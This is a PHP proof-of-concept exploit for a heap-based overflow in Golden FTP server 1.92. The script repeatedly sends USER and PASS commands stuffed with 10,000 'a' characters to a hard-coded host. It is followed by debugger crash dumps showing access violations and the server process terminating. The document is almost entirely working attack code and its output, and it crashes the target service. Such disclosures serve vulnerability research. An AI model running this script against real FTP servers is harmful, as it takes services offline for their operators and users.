<?php
#23.07 03/12/2006
#Golden FTP server 1.92 (freeware edition) USER/PASS heap based overflow poc

$host="192.168.1.3";
$port="21";

$junk="";
for ($i=1; $i<=10000; $i++){
    $junk.="a";
}

echo strlen($junk);
for ($i=1; $i<4; $i++)
{
    $sock=@fsockopen($host,$port,$errno, $errstr, 10);
    if (!$sock){
        die("\nnot connected!\n");
        }
    else {
        fgets($sock,80);
        fputs($sock,"USER ".$junk."\r\n");
        fgets($sock,80);
        fputs($sock,"PASS ".$junk."\r\n");
        fclose($sock);
        }
}
?>

/* some faultmon dumps...

23:17:27.343  pid=0220 tid=0B4C  EXCEPTION (first-chance)
              ----------------------------------------------------------------
              Exception C0000005 (ACCESS_VIOLATION reading [61616175])
              ----------------------------------------------------------------
              EAX=61616175: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              ECX=61616161: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDX=00EBFD64: EC 88 A6 00 F4 BF A5 00-F4 87 A6 00 BC FD EB 00
              ESP=00EBFD1C: 00 00 00 00 58 FD EB 00-61 24 41 00 74 88 A6 00
              EBP=00EBFD20: 58 FD EB 00 61 24 41 00-74 88 A6 00 F4 BF A5 00
              ESI=004B9F04: 61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61
              EDI=004B9F00: 61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61
              EIP=004A9B74: 8B 00 8B 12 E8 5F F6 FD-FF 0F 94 C0 83 E0 01 5B
                            --> MOV EAX,[EAX]
              ----------------------------------------------------------------

23:17:27.353  pid=0220 tid=0B4C  Thread exited with code 0
23:17:27.353  pid=0220 tid=0B70  Created thread with EIP=7C810659, TIB at 7FFDB0
00
23:17:27.703  pid=0220 tid=0B70  EXCEPTION (first-chance)
              ----------------------------------------------------------------
              Exception C0000005 (ACCESS_VIOLATION reading [61616175])
              ----------------------------------------------------------------
              EAX=61616175: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              ECX=61616161: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDX=00FBFD64: 50 2B A7 00 F4 BF A5 00-60 2B A7 00 BC FD FB 00
              ESP=00FBFD1C: 00 00 00 00 58 FD FB 00-61 24 41 00 E0 2B A7 00
              EBP=00FBFD20: 58 FD FB 00 61 24 41 00-E0 2B A7 00 F4 BF A5 00
              ESI=004B9F04: 61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61
              EDI=004B9F00: 61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61
              EIP=004A9B74: 8B 00 8B 12 E8 5F F6 FD-FF 0F 94 C0 83 E0 01 5B
                            --> MOV EAX,[EAX]
              ----------------------------------------------------------------

23:17:27.713  pid=0220 tid=0B70  Thread exited with code 0
23:17:27.723  pid=0220 tid=0C80  Created thread with EIP=7C810659, TIB at 7FFDC0
00
23:17:28.164  pid=0220 tid=0C80  EXCEPTION (first-chance)
              ----------------------------------------------------------------
              Exception C0000005 (ACCESS_VIOLATION reading [61616175])
              ----------------------------------------------------------------
              EAX=61616175: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              ECX=61616161: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDX=00EBFD64: 68 2E A7 00 F4 BF A5 00-78 2E A7 00 BC FD EB 00
              ESP=00EBFD1C: 00 00 00 00 58 FD EB 00-61 24 41 00 F8 2E A7 00
              EBP=00EBFD20: 58 FD EB 00 61 24 41 00-F8 2E A7 00 F4 BF A5 00
              ESI=004B9F04: 61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61
              EDI=004B9F00: 61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61
              EIP=004A9B74: 8B 00 8B 12 E8 5F F6 FD-FF 0F 94 C0 83 E0 01 5B
                            --> MOV EAX,[EAX]
              ----------------------------------------------------------------


now server is unusable, and when admin click exit...

23:17:28.184  pid=0220 tid=0C80  Thread exited with code 0
23:17:45.629  pid=0220 tid=0D98  Thread exited with code 0
23:17:45.629  pid=0220 tid=0D90  EXCEPTION (first-chance)
              ----------------------------------------------------------------
              Exception C0000005 (ACCESS_VIOLATION reading [6161D16D])
              ----------------------------------------------------------------
              EAX=7FFFFFFF: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EBX=004B9673: 61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61
              ECX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDX=6161D16D: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              ESP=0012F760: 96 C7 4A 00 00 00 00 00-EC 96 4B 00 E2 6A 43 00
              EBP=0012FC8C: AC FC 12 00 EE D8 48 00-64 D8 48 00 B4 FC 12 00
              ESI=004AC79A: 2E 73 68 72 00 00 00 2E-63 66 67 00 00 46 6F 72
              EDI=00000020: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EIP=0048E27F: 80 3A 00 75 EE E9 C5 00-00 00 F7 C7 00 01 00 00
                            --> CMP BYTE PTR [EDX],00
              ----------------------------------------------------------------

23:17:45.629  pid=0220 tid=0D90  EXCEPTION (first-chance)
              ----------------------------------------------------------------
              Exception C0000005 (ACCESS_VIOLATION reading [61616159])
              ----------------------------------------------------------------
              EAX=004B9EE8: 00 00 00 00 61 61 61 61-61 61 61 61 61 61 61 61
              EBX=004B9EE8: 00 00 00 00 61 61 61 61-61 61 61 61 61 61 61 61
              ECX=004B96F4: 61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61
              EDX=61616161: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              ESP=0012FE9C: B9 9A 4A 00 00 00 00 00-E8 9E 4B 00 E8 9E 4B 00
              EBP=0012FEAC: E4 FE 12 00 50 B4 48 00-88 B2 4A 00 20 00 00 00
              ESI=00000002: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EIP=00488E58: 8B 4A F8 49 7C 10 F0 FF-4A F8 75 0A 50 8D 42 F8
                            --> MOV ECX,[EDX-08]
              ----------------------------------------------------------------

23:17:45.629  pid=0220 tid=0D90  EXCEPTION (first-chance)
              ----------------------------------------------------------------
              Exception C0000005 (ACCESS_VIOLATION reading [61616159])
              ----------------------------------------------------------------
              EAX=004B9EE4: 00 00 00 00 00 00 00 00-61 61 61 61 61 61 61 61
              EBX=004B9EE4: 00 00 00 00 00 00 00 00-61 61 61 61 61 61 61 61
              ECX=004B96F4: 61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61
              EDX=61616161: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              ESP=0012FE4C: B9 9A 4A 00 00 00 00 00-E4 9E 4B 00 E4 9E 4B 00
              EBP=0012FE5C: 94 FE 12 00 50 B4 48 00-B4 FB 12 00 10 00 00 00
              ESI=00000002: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EIP=00488E58: 8B 4A F8 49 7C 10 F0 FF-4A F8 75 0A 50 8D 42 F8
                            --> MOV ECX,[EDX-08]
              ----------------------------------------------------------------

23:17:56.775  pid=0220 tid=0D90  Process exited with code 3


*/
